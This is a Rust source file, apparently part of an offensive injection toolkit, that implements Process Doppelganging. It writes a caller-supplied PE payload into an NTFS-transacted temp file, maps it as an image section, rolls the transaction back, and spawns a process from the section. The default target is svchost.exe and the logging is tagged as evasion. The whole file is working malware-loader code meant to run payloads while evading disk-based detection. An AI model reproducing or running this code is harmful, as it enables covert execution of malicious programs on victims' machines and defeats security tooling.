//! Process Doppelganging - execute PE via NTFS transactions
//! Uses NtCreateTransaction to write payload to a transacted file, create section, then rollback.

use crate::error::MemoricError;
use ntapi::winapi::ctypes::c_void as nt_void;
use serde_json::Value;

/// Process Doppelganging: use NTFS transaction to load PE without touching disk permanently
pub fn process_doppelgang(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::Storage::FileSystem::WriteFile;

    let payload_val = args
        .get("payload")
        .and_then(|v| v.as_array())
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing payload (PE bytes array)".to_string())
        })?;
    let payload: Vec<u8> = payload_val
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    let target_file = args
        .get("target_file")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\System32\\svchost.exe");

    if payload.is_empty() {
        return Err(MemoricError::InjectionFailed(
            "Payload is empty".to_string(),
        ));
    }

    tracing::warn!(
        "[EVASION] Process Doppelganging: {} bytes via transaction on {}",
        payload.len(),
        target_file
    );

    unsafe {
        // Step 1: Create transaction via ntapi
        let mut transaction_handle: *mut nt_void = std::ptr::null_mut();
        let mut oa: ntapi::winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        oa.Length = std::mem::size_of_val(&oa) as u32;

        let status = ntapi::nttmapi::NtCreateTransaction(
            &mut transaction_handle,
            0x1F01FF,
            &mut oa as *mut _ as *mut _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateTransaction failed: 0x{:08X}",
                status
            )));
        }

        // Step 2: Open file within transaction via CreateFileTransactedW
        let temp_path = "C:\\Windows\\Temp\\doppel.tmp";
        let temp_w: Vec<u16> = temp_path.encode_utf16().chain(std::iter::once(0)).collect();

        type CreateFileTransactedWFn = unsafe extern "system" fn(
            *const u16,
            u32,
            u32,
            *const nt_void,
            u32,
            u32,
            *const nt_void,
            *mut nt_void,
            *const u16,
            *const nt_void,
        ) -> *mut nt_void;

        let kernel32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(
            windows::core::PCSTR(b"kernel32.dll\0".as_ptr()),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandle kernel32: {}", e)))?;

        let proc_addr = windows::Win32::System::LibraryLoader::GetProcAddress(
            kernel32,
            windows::core::PCSTR(b"CreateFileTransactedW\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("CreateFileTransactedW not found".to_string()))?;

        let create_file_txn: CreateFileTransactedWFn = std::mem::transmute(proc_addr);

        let txn_file = create_file_txn(
            temp_w.as_ptr(),
            0xC0000000,
            0,
            std::ptr::null(),
            2,
            0,
            std::ptr::null(),
            transaction_handle,
            std::ptr::null(),
            std::ptr::null(),
        );

        if txn_file.is_null() || txn_file == (-1isize) as *mut _ {
            let _ = ntapi::nttmapi::NtRollbackTransaction(transaction_handle, 1);
            return Err(MemoricError::WindowsApi(
                "CreateFileTransactedW failed".to_string(),
            ));
        }

        let txn_handle = windows::Win32::Foundation::HANDLE(txn_file as *mut _);
        WriteFile(txn_handle, Some(&payload), None, None).map_err(|e| {
            let _ = CloseHandle(txn_handle);
            let _ = ntapi::nttmapi::NtRollbackTransaction(transaction_handle, 1);
            MemoricError::WindowsApi(format!("WriteFile failed: {}", e))
        })?;

        // Step 3: Create image section
        let mut section_handle: *mut nt_void = std::ptr::null_mut();
        let status = ntapi::ntmmapi::NtCreateSection(
            &mut section_handle,
            0xF001F,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,
            0x1000000,
            txn_file,
        );
        let _ = CloseHandle(txn_handle);
        let _ = ntapi::nttmapi::NtRollbackTransaction(transaction_handle, 1);

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateSection failed: 0x{:08X}",
                status
            )));
        }

        // Step 4: Create process from section
        let mut process_handle: *mut nt_void = std::ptr::null_mut();
        let status = ntapi::ntpsapi::NtCreateProcessEx(
            &mut process_handle,
            0x1FFFFF,
            std::ptr::null_mut(),
            (-1isize) as *mut nt_void,
            0,
            section_handle,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
        );
        let _ = CloseHandle(windows::Win32::Foundation::HANDLE(section_handle as *mut _));

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateProcessEx failed: 0x{:08X}",
                status
            )));
        }

        let mut pbi: ntapi::ntpsapi::PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let mut ret_len = 0u32;
        ntapi::ntpsapi::NtQueryInformationProcess(
            process_handle,
            ntapi::ntpsapi::ProcessBasicInformation,
            &mut pbi as *mut _ as *mut nt_void,
            std::mem::size_of::<ntapi::ntpsapi::PROCESS_BASIC_INFORMATION>() as u32,
            &mut ret_len,
        );

        let doppel_pid = pbi.UniqueProcessId as u64;
        let _ = CloseHandle(windows::Win32::Foundation::HANDLE(process_handle as *mut _));

        Ok(serde_json::json!({
            "success": true,
            "technique": "process_doppelganging",
            "doppel_pid": doppel_pid,
            "payload_size": payload.len(),
            "target_file": target_file,
            "message": "Process created via NTFS transaction — payload never committed to disk"
        }))
    }
}
